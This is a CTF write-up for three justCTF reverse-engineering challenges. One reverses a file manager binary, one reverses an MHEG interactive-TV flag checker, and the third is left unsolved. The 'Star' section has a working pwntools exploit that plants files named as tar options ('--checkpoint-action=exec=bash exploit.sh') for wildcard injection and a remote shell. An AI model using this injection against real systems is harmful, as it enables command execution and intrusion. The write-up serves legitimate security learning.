# Reverse Engineering

<table><thead><tr><th width="347">Challenge</th><th>Link</th></tr></thead><tbody><tr><td>Star (201 pts) 🥇</td><td><a href="#star-201-pts">Here</a></td></tr><tr><td>Just TV (326 pts) 🥈</td><td><a href="#just-tv-326-pts">Here</a></td></tr><tr><td>Cursed Protocol (500 pts)</td><td><a href="#cursed-protocol-500-pts">Here</a></td></tr></tbody></table>

## Star (201 pts)

### Description

I made my own file manager... Here you have a DEMO version of it.

Author: Rivit

```
nc star.nc.jctf.pro 1337
```

### Solution

Given ELF 64 bit file, open it using IDA. I rebase the program by using Edit->Segments->Rebase Program and put 0x555555554000 as value to make it same like in GDB.

{% code title="main" %}

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  __int64 v3; // rsi
  void (__fastcall ***v4)(_QWORD); // rax
  char v5[8]; // [rsp+8h] [rbp-B0h] BYREF
  char v6[8]; // [rsp+10h] [rbp-A8h] BYREF
  char v7[8]; // [rsp+18h] [rbp-A0h] BYREF
  char v8[8]; // [rsp+20h] [rbp-98h] BYREF
  char v9[8]; // [rsp+28h] [rbp-90h] BYREF
  char v10[8]; // [rsp+30h] [rbp-88h] BYREF
  char v11[8]; // [rsp+38h] [rbp-80h] BYREF
  char v12[8]; // [rsp+40h] [rbp-78h] BYREF
  __int64 (__fastcall **v13)(); // [rsp+48h] [rbp-70h] BYREF
  char v14[8]; // [rsp+50h] [rbp-68h] BYREF
  char v15[8]; // [rsp+58h] [rbp-60h] BYREF
  char v16[8]; // [rsp+60h] [rbp-58h] BYREF
  char v17[8]; // [rsp+68h] [rbp-50h] BYREF
  char v18[8]; // [rsp+70h] [rbp-48h] BYREF
  char v19[8]; // [rsp+78h] [rbp-40h] BYREF
  char v20[8]; // [rsp+80h] [rbp-38h] BYREF
  char v21[8]; // [rsp+88h] [rbp-30h] BYREF
  char v22[8]; // [rsp+90h] [rbp-28h] BYREF
  unsigned __int64 v23; // [rsp+98h] [rbp-20h]

  v23 = __readfsqword(0x28u);
  sub_555555559840();
  sub_55555555E300(v5);
  sub_55555555F2F0(v14, v5);
  sub_55555555F2C0(v5);
  sub_55555555E440(v6);
  sub_55555555F3C0(v15, v6);
  sub_55555555F390(v6);
  sub_55555555E580(v7);
  sub_55555555F490(v16, v7);
  sub_55555555F460(v7);
  sub_55555555E6C0(v8);
  sub_55555555F560(v17, v8);
  sub_55555555F530(v8);
  sub_55555555E800(v9);
  sub_55555555F630(v18, v9);
  sub_55555555F600(v9);
  sub_55555555E940(v10);
  sub_55555555F700(v19, v10);
  sub_55555555F6D0(v10);
  sub_55555555EA80(v11);
  sub_55555555F7D0(v20, v11);
  sub_55555555F7A0(v11);
  sub_55555555EBC0(v12);
  sub_55555555F8A0(v21, v12);
  sub_55555555F870(v12);
  sub_55555555EA80(&v13);
  sub_55555555F7D0(v22, &v13);
  sub_55555555F7A0(&v13);
  while ( 1 )
  {
    v13 = off_555555566978;
    sub_55555555D250();
    v3 = (unsigned int)choose_menu();
    sub_55555555AED0((__int64)v14, v3);
    v4 = (void (__fastcall ***)(_QWORD))sub_55555555FA20();
    (**v4)(v4);
  }
}
```

{% endcode %}

So basically there will be dynamic call to the function after we input the menu number. All the available command can be seen on 0x0000555555566968 - 0x0000555555566AD0.

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FXWuRLprZIPos2YFy6stZ%2Fimage.png?alt=media&amp;token=b1fb96c9-0a6a-44b3-956e-1627b93b3042" alt=""><figcaption></figcaption></figure>

Based on the description, the given executable is DEMO version and from above image we can see that there are only 6 command include exit. Looking at available command on program we found that there is "compress" command.

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FgleCGV6YW0pW4cmrc2At%2Fimage.png?alt=media&amp;token=9b4916ae-a531-48a1-bf94-689fce451636" alt=""><figcaption></figcaption></figure>

So we need to find number for compress command first. Lets go to GDB.

```
b *0x0000555555558a5c
```

Now we need to find the address for menu 1 and menu 2. Go to first menu by putting 1 as the input.

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FfEagiFNVYkR5VE025zzs%2Fimage.png?alt=media&amp;token=7e2d6b97-faf6-41c7-8bfb-7c921cc4df0f" alt=""><figcaption></figcaption></figure>

Go to second menu by putting 2 as the input.

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2F3QHfS5N0MQC2CepZkbyu%2Fimage.png?alt=media&amp;token=7cb5b351-fa0f-4162-bf08-6d89b7c04dce" alt=""><figcaption></figcaption></figure>

Lets calculate the number for compress menu, first find the reference for address 0x555555566A90 (CommpressCommand).

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2F9Fh9ND2BorWXuMBfn4Ot%2Fimage.png?alt=media&amp;token=7a824840-d09a-4e97-bc28-2437e0b864c2" alt=""><figcaption></figcaption></figure>

```python
menu1 = 0x0000555555579fb0
menu2 = 0x0000555555579fd0 
target_menu  = 0x55555557a070

diff = menu2 - menu1 # 32

# number = ((menux - menu1) // 32) + 1
print(((target_menu - menu1)//diff) + 1)
```

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2F5MgXMtYdMuQMHDJCCzRd%2Fimage.png?alt=media&amp;token=cf33ff9e-dfd0-4aac-b10b-c80cac806782" alt=""><figcaption></figcaption></figure>

Lets try with number 7 and we will go to compress command.

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FcUNtksZIr8kaW9S2wpYu%2Fimage.png?alt=media&amp;token=8ca2b921-d344-46a4-8b09-6a88b61c0ee7" alt=""><figcaption></figcaption></figure>

Our objective is getting RCE to get flag on server. Compress command utilize system function to do compressing, lets dump the argument.

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FEAH6OBtyHaHVcfuoCbno%2Fimage.png?alt=media&amp;token=b3948b19-2c1c-4fe1-bbdd-efa7c7eab5a7" alt=""><figcaption></figcaption></figure>

```
b *0x55555555D981
```

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FlqUX7jSyjthUCZMc3gVO%2Fimage.png?alt=media&amp;token=6e214b67-07fc-4d74-a416-45c5bba7e1c6" alt=""><figcaption></figcaption></figure>

So it use tar command to do compression, looking at GTFOBins we know that we can abuse tar command to get shell. tar also vulnerable to wildcard injection, so we can get shell by using wildcard injection with argument same like in GTFOBins. Looking at rename command we found that we can input any character as the new filename, now we can utilize all available command to make the payload for RCE.

```python
from pwn import *

def create_file(filename):
	r.recvuntil(b"> ")
	r.sendline(b"1")
	r.recvuntil(b"filename: ")
	r.sendline(filename)

def edit_file(filename, content):
	r.recvuntil(b"> ")
	r.sendline(b"5")
	r.recvuntil(b"filename: ")
	r.sendline(filename)
	r.recvuntil(b"data: ")
	r.sendline(content)

def rename_file(filename, new_filename):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"filename: ")
	r.sendline(filename)
	r.recvuntil(b"filename: ")
	r.sendline(new_filename)

def compress(filename):
	r.recvuntil(b"> ")
	r.sendline(b"7")
	r.recvuntil(b"name: ")
	r.sendline(filename)

# r = process("./star")
r = remote("star.nc.jctf.pro", 1337)

create_file(b"a")
create_file(b"b")
create_file(b"exploit.sh")

edit_file(b"exploit.sh", b"sh")

rename_file(b"a", b"--checkpoint-action=exec=bash exploit.sh")
rename_file(b"b", b"--checkpoint=1")

compress(b"asd")

r.interactive()
```

Flag: justCTF{th3\_st4r\_1s\_sh1n1ng}

## Just TV (326 pts)

### Description

My favorite TV channel has recently become more interactive...

### Solution

Given .asn files, after searching for a while we found repository that looks like have the same file <https://github.com/igilham/mheg-slate>. Looking at the reference for mheg we found that we can decompile the given file to the source code using [mhgenc](https://code.google.com/archive/p/mhegenc/downloads). After getting the source code actually it still hard to get the flag because we're not familiar with the code. Looking at another reference we found that we can debug the file using [MHEGPlayer](https://sourceforge.net/projects/mhegplus/).&#x20;

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FN1DLNyVQtsUe7Hy9tDXo%2Fimage.png?alt=media&amp;token=fc858f4b-246b-4ec8-80c2-ae701278d05b" alt=""><figcaption></figcaption></figure>

With above directory structure we can run the file using below command then click `populate carousel from disk`.

```
java -Dmheg-source-root=src/ -Ddfs-root-dir=src/ -Dfile-mapping.//a=src/a -Dmheg.profile=uk.dtt -jar MhegPlus.MhegPlayer-1.0.1a.jar
```

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FZsLpVMI8TFCT4NpoaiES%2Fimage.png?alt=media&amp;token=4f5fd752-9fea-452f-9d70-0a7fd99887cd" alt=""><figcaption></figcaption></figure>

Click `Play in realtime` so we can interact with the program. To go to the flag validation program we can follow the screen instruction.

```
Press Blue
Select Extras (down-down-select)
```

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FdyXG4bQRhP19plyVqKqS%2Fimage.png?alt=media&amp;token=9b3ad7d2-bee1-40e0-919d-a0e56dad86e1" alt=""><figcaption></figcaption></figure>

Now we need to find where is our input processed. When we input invalid value the background will be red, so if we check in the source code we see that there is call of setBackgroundColor with color 0xff0000

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FEtsem1IJbjJZ7WClw0mz%2Fimage.png?alt=media&amp;token=65b323e9-9947-4417-9911-acc380c7f52d" alt=""><figcaption></figcaption></figure>

So the link identifier is 2583, we can trace the call by searching 2583.

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FPuwno4rFRr6FK2KWJLjL%2Fimage.png?alt=media&amp;token=a32ca45a-fb88-4d73-9b1f-576c3f608cae" alt=""><figcaption></figcaption></figure>

We can see on image above there is :Activate (2583) which mean that link 2583 bound with those line of code.  After Activate instruction there is TestVariable instruction, lets try to find the emulator source code so we can see what is TestVariable do and also its constant. Found this [reference](https://github.com/roshantha9/SimpleMHEGPong/blob/122acd107202f6f4f86915bcc6109bce06e222f0/dev_text_src/rel/~COMPLETE_pong.mheg5#L613) on github. Now we have the operator and its value on this [code](https://github.com/roshantha9/SimpleMHEGPong/blob/122acd107202f6f4f86915bcc6109bce06e222f0/dev_text_src/rel/~INCLUDE_pong.mheg5).

```
$define eq 1
$define ne 2
$define lt 3
$define le 4
$define gt 5
$define ge 6
```

So for line 5070 until 5072 we can convert to below pseudocode

```python
if var_70 == var_52:
    link_2584()
else:
    link_2583()
```

Until this step we know that the function that process our input is on :Link 117 (line 1228). Set breakpoint on line 1235 (click on line number) and lets analyze what the call means. To trigger the breakpoint input any value then select "Confirm".

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FfAdOjhGj4hd51Bomonlm%2Fimage.png?alt=media&amp;token=165b2a95-a535-45cd-9003-0bccf1b8330f" alt=""><figcaption></figcaption></figure>

```
1235:        :Call ( 27 34 
1236:                :GOctetString :IndirectRef 53 
1237:                :GInteger :IndirectRef 61 
1238:        ) 
```

* 27 is identifier for GSL

```
3:    { :ResidentPrg 27 
4:      :InitiallyActive FALSE
5:      :Name 'GSL' 
6:    }
```

* 34 is identifier for False

```
31:    { :BooleanVar 34 
32:      :OrigValue FALSE 
33:    }
```

* 53 is our input

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FyZmWUoCbbvIj4zQwaTiB%2Fimage.png?alt=media&amp;token=3770d471-bd84-4689-a77a-c1b2b511e80c" alt=""><figcaption></figcaption></figure>

* 61 is output

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FPjWJbUxnR2HKUjr0PDz7%2Fimage.png?alt=media&amp;token=5e96aaee-be01-4893-bd73-7bf50c06ba4d" alt=""><figcaption></figcaption></figure>

What is GSL mean? lets try to take a look on [mhegplus](https://sourceforge.net/p/mhegplus/code/HEAD/tree/) emulator.

```
svn checkout https://svn.code.sf.net/p/mhegplus/code/trunk mhegplus-codels
```

* mhegplus-code/MhegPlus.Compiler/src/bbc/dtv/mhegplus/mhegactions/MhegCall.java

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FEFQX5IssRqLzYnDQ5DOQ%2Fimage.png?alt=media&amp;token=28bec355-5370-4a7b-89e2-978ff81d2b1e" alt=""><figcaption></figcaption></figure>

So GSL is Get String Length which same like strlen. Through stepping we can see that it is a valid strlen.

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FvdowT5OKCsIIhAI5iVCz%2Fimage.png?alt=media&amp;token=55c78e8b-063b-48ee-9721-0388f25ca472" alt=""><figcaption></figcaption></figure>

Okay now we know the approach to understand the code, lets convert each part

```
1235:        :Call ( 27 34 
1236:                :GOctetString :IndirectRef 53 
1237:                :GInteger :IndirectRef 61 
1238:        ) 
1239:        :Multiply ( 61 7 ) 
1240:        :Call ( 29 34 
1241:                :GOctetString :IndirectRef 51 
1242:                :GInteger 0 
1243:                :GInteger :IndirectRef 61 
1244:                :GOctetString :IndirectRef 63 
1245:        ) 
1246:        :Call ( 27 34 
1247:                :GOctetString :IndirectRef 51 
1248:                :GInteger :IndirectRef 62 
1249:        ) 
1250:        :Add ( 61 1 ) 
1251:        :Call ( 29 34 
1252:                :GOctetString :IndirectRef 51 
1253:                :GInteger :IndirectRef 61 
1254:                :GInteger :IndirectRef 62 
1255:                :GOctetString :IndirectRef 64 
1256:        ) 
1257:        :SetVariable ( 65 :GOctetString '' ) 
1258:        :Append ( 65 :IndirectRef 64 ) 
1259:        :Append ( 65 :IndirectRef 63 ) 
```

```python
# our input
inp = "abc"

# 1235 - 1245
var51 = "00011001101110001010100100010001100100011001000011010001110101001111011011000100100111100100001011000010111001110101101110101100100101111010001100011110010111000010010100111100111101111011110100111010010110011010111110110111010111100100011110011100000010010100110100000110101011110101001010000010101000101001001010010111101110111110011001010100010000000110100001110100101111110100110011011100100000011011010101011110010010111111011101001111000100001101101001011000000001111110"
length = len(inp)
var63 = var51[0:length * 7]

# 1246 - 1256
var64 = var51[(length * 7):len(var51)]

var65 = var64
var65 += var63

print(var65)
```

Continue to next part, basically we just need to reverse one function for 611 - 678 because it do the same thing but with different value (based on index). It was like loop flow that has been flattened.

```
1260:        :SetVariable ( 69 :GOctetString '' ) 
1261:        :Call ( 27 34 
1262:                :GOctetString :IndirectRef 53 
1263:                :GInteger :IndirectRef 61 
1264:        ) 
1265:        :Activate ( 611 ) 
1266:        :TestVariable ( 61 6 :GInteger 1 ) 
1267:        :Deactivate ( 611 ) 
1268:        :Call ( 27 34 
1269:                :GOctetString :IndirectRef 53 
1270:                :GInteger :IndirectRef 61 
1271:        ) 
```

```python
def link_611(a1):
	tmp = a1
	index = var49.index(tmp)
	index += 1
	val1 = ((index - 1) * 7) + 1
	val2 = index * 7
	tmp_var69 = (var50[val1 - 1:val2])
	return tmp_var69


# our input
var50 = "0000000000000100000100000011000010000001010000110000011100010000001001000101000010110001100000110100011100001111001000000100010010010001001100101000010101001011000101110011000001100100110100011011001110000111010011110001111101000000100001010001001000110100100010010101001100100111010100001010010101010010101101011000101101010111001011110110000011000101100100110011011010001101010110110011011101110000111001011101001110110111100011110101111100111111100000010000011000010100001110001001000101100011010001111001000100100110010101001011"
var49 = "1234567890qwertyuiopasdfghjkl{zxcvbnm_!@#$%^&*+=3DQWERTYUIOPASDFGHJKL}ZXCVBNM-"
inp = "abc"

# 1235 - 1245
var51 = "00011001101110001010100100010001100100011001000011010001110101001111011011000100100111100100001011000010111001110101101110101100100101111010001100011110010111000010010100111100111101111011110100111010010110011010111110110111010111100100011110011100000010010100110100000110101011110101001010000010101000101001001010010111101110111110011001010100010000000110100001110100101111110100110011011100100000011011010101011110010010111111011101001111000100001101101001011000000001111110"
length = len(inp)
var63 = var51[0:length * 7]

# 1246 - 1256
var64 = var51[(length * 7):len(var51)]

var65 = var64
var65 += var63

# 1260 - 1736
i = 0
var69 = ""
while length > i:
	var69 += link_611(inp[i])
	i += 1
print(var69)


```

Continue to next part

```
1737:        :SetVariable ( 70 :GOctetString '' ) 
1738:        :Call ( 27 34 
1739:                :GOctetString :IndirectRef 69 
1740:                :GInteger :IndirectRef 61 
1741:        ) 
1742:        :Activate ( 682 ) 
1743:        :Activate ( 681 ) 
1744:        :TestVariable ( 61 6 :GInteger 1 ) 
1745:        :Call ( 27 34 
1746:                :GOctetString :IndirectRef 69 
1747:                :GInteger :IndirectRef 61 
1748:        ) 
1749:        :Activate ( 686 ) 
1750:        :Activate ( 685 ) 
```

```python
def link_611(a1):
	tmp = a1
	index = var49.index(tmp)
	index += 1
	val1 = ((index - 1) * 7) + 1
	val2 = index * 7
	tmp_var69 = (var50[val1 - 1:val2])
	return tmp_var69


# our input
var50 = "0000000000000100000100000011000010000001010000110000011100010000001001000101000010110001100000110100011100001111001000000100010010010001001100101000010101001011000101110011000001100100110100011011001110000111010011110001111101000000100001010001001000110100100010010101001100100111010100001010010101010010101101011000101101010111001011110110000011000101100100110011011010001101010110110011011101110000111001011101001110110111100011110101111100111111100000010000011000010100001110001001000101100011010001111001000100100110010101001011"
var49 = "1234567890qwertyuiopasdfghjkl{zxcvbnm_!@#$%^&*+=3DQWERTYUIOPASDFGHJKL}ZXCVBNM-"
inp = "abc"

# 1235 - 1245
var51 = "00011001101110001010100100010001100100011001000011010001110101001111011011000100100111100100001011000010111001110101101110101100100101111010001100011110010111000010010100111100111101111011110100111010010110011010111110110111010111100100011110011100000010010100110100000110101011110101001010000010101000101001001010010111101110111110011001010100010000000110100001110100101111110100110011011100100000011011010101011110010010111111011101001111000100001101101001011000000001111110"
length = len(inp)
var63 = var51[0:length * 7]

# 1246 - 1256
var64 = var51[(length * 7):len(var51)]

var65 = var64
var65 += var63

# 1260 - 1736
i = 0
var69 = ""
while length > i:
	var69 += link_611(inp[i])
	i += 1
print(var69)

# 1737 - 5072
i = 0
var70 = ""
while len(var69) > i:
	if var69[i] == var65[i]:
		var70 += "0"
	else:
		var70 += "1"
	i += 1

print(var70)
```

Now we have reproduce the flow, looks like we can simplify some of the process. Lets simplify it.

```python
def link_611(a1):
	index = var49.index(a1)
	return var50[index]

def make_block(arr, length):
	blocks = []
	for i in range(0, len(arr), length):
		blocks.append(arr[i:i+7])
	return blocks

def xor(a1, a2):
	tmp1 = int(a1, 2)
	tmp2 = int(a2, 2)
	return bin(tmp1 ^ tmp2)[2:].rjust(7, "0")

# our input
var50 = "0000000000000100000100000011000010000001010000110000011100010000001001000101000010110001100000110100011100001111001000000100010010010001001100101000010101001011000101110011000001100100110100011011001110000111010011110001111101000000100001010001001000110100100010010101001100100111010100001010010101010010101101011000101101010111001011110110000011000101100100110011011010001101010110110011011101110000111001011101001110110111100011110101111100111111100000010000011000010100001110001001000101100011010001111001000100100110010101001011"
var51 = "00011001101110001010100100010001100100011001000011010001110101001111011011000100100111100100001011000010111001110101101110101100100101111010001100011110010111000010010100111100111101111011110100111010010110011010111110110111010111100100011110011100000010010100110100000110101011110101001010000010101000101001001010010111101110111110011001010100010000000110100001110100101111110100110011011100100000011011010101011110010010111111011101001111000100001101101001011000000001111110"
var49 = "1234567890qwertyuiopasdfghjkl{zxcvbnm_!@#$%^&*+=3DQWERTYUIOPASDFGHJKL}ZXCVBNM-"
inp = "abc"

var51 = make_block(var51, 7)
var50 = make_block(var50, 7)

# 1235 - 1245
length = len(inp)
var63 = var51[:length]

# 1246 - 1256
var64 = var51[length:]

var65 = var64 + var63

# 1260 - 1736
i = 0
var69 = ""
while length > i:
	var69 += link_611(inp[i])
	i += 1

var69 = make_block(var69, 7)

# 1737 - 5072
var70 = ""
for i in range(len(var69)):
	var70 += xor(var69[i], var65[i])
print(var70)
```

Now just reverse the algorithm. Although we've successfully reverse the algorithm but we can't find the valid flag. So we just notice that the length flag is not 67, so the next step we do is implement bruteforce for flag length during the reverse process.

```python
def rev_link_611(a1):
	index = var50.index(a1)
	return var49[index]

def make_block(arr, length):
	blocks = []
	for i in range(0, len(arr), length):
		blocks.append(arr[i:i+7])
	return blocks

def xor(a1, a2):
	tmp1 = int(a1, 2)
	tmp2 = int(a2, 2)
	return bin(tmp1 ^ tmp2)[2:].rjust(7, "0")

def init(length):
	var63 = var51[:length]
	var64 = var51[length:]
	var65 = var64 + var63
	return var65

# our input
var50 = "0000000000000100000100000011000010000001010000110000011100010000001001000101000010110001100000110100011100001111001000000100010010010001001100101000010101001011000101110011000001100100110100011011001110000111010011110001111101000000100001010001001000110100100010010101001100100111010100001010010101010010101101011000101101010111001011110110000011000101100100110011011010001101010110110011011101110000111001011101001110110111100011110101111100111111100000010000011000010100001110001001000101100011010001111001000100100110010101001011"
var51 = "00011001101110001010100100010001100100011001000011010001110101001111011011000100100111100100001011000010111001110101101110101100100101111010001100011110010111000010010100111100111101111011110100111010010110011010111110110111010111100100011110011100000010010100110100000110101011110101001010000010101000101001001010010111101110111110011001010100010000000110100001110100101111110100110011011100100000011011010101011110010010111111011101001111000100001101101001011000000001111110"
# invalid
# var49 = "1234567890qwertyuiopasdfghjkl{zxcvbnm_!@#$%^&*+=3DQWERTYUIOPASDFGHJKL}ZXCVBNM-"
var49 = "1234567890qwertyuiopasdfghjkl{zxcvbnm_!@#$%^&*+=QWERTYUIOPASDFGHJKL}ZXCVBNM-"

var51 = make_block(var51, 7)
var50 = make_block(var50, 7)
var70 = "11010011010000101111101110101001011001101100101000111101101110101101010000010111101110000110100001000111101100000001110010010000000001011111001101111110011110111100111000111111101000110110010111100111110001111010110100110111000001001111010001100110111000101010010001000110010001100100001101000111010100111101101100010010011110010000101100001011100111010110111010110010010111101000110001111001011100001001010011110011110111101111010011101001011001101011111011011101011110010001"
var70 = make_block(var70, 7)

for length in range(68):
	try:
		var65 = init(length)
		# var52 == var70 for the flag
		var69 = ""
		for i in range(len(var70)):
			var69 += xor(var70[i], var65[i])
		var69 = make_block(var69, 7)
		i = 0
		inp = ""
		while length > i:
			inp += rev_link_611(var69[i])
			i += 1
		print(length, inp)
	except Exception as e:
		continue
```

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2F20H21LKz2rStsBgT43c1%2Fimage.png?alt=media&amp;token=598cde24-243a-4598-93c5-b958302f1986" alt=""><figcaption></figcaption></figure>

Flag: justCTF{0ld\_TV\_c4n\_b3\_InTeR4ctIv3}

## Cursed Protocol (500 pts)

### Description

Dedicated for IoT devices, this handshake protocol will defeat any hacker that might try to reverse engineer the control application.

### Solution

0 solve... TBU
